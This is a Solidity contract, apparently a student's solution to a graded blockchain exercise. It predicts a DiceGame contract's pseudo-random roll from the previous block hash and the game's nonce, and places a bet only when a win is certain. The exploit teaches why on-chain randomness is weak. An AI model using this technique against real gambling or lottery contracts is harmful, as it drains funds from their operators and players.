pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
	error NotEnoughEther();
	DiceGame public diceGame;

	// mapping(address => uint256) public balances;

	constructor(address payable diceGameAddress) {
		diceGame = DiceGame(diceGameAddress);
	}

	// Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
	function withdraw(address _addr, uint256 _amount) public onlyOwner {
		// require(balances[msg.sender] >= _amount, "You don't have money");
		// uint256 amount = balances[msg.sender] - _amount;
		// balances[msg.sender] = amount;

		(bool success, ) = _addr.call{ value: _amount }("");
		require(success, "Transfer failed");
	}

	// Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
	function riggedRoll() public payable {
		if (msg.value < 0.002 ether) {
			revert NotEnoughEther();
		}
		bytes32 prevHash = blockhash(block.number - 1);
		bytes32 hash = keccak256(
			abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())
		);
		uint256 roll = uint256(hash) % 16;
		console.log("\t", "   RiggedRoll Game:", roll);
		// if (roll > 5) {
		// 	riggedRoll();
		// 	return;
		// }
		// diceGame.rollTheDice{ value: msg.value }();

		// Check if it's a winning roll (dice roll <= 5 is a winner)
		if (roll <= 5) {
			diceGame.rollTheDice{ value: msg.value }(); // Roll only if it's a winning roll
		} else {
			revert("Unfavorable roll predicted");
		}
	}

	// Include the `receive()` function to enable the contract to receive incoming Ether.
	receive() external payable {}
}
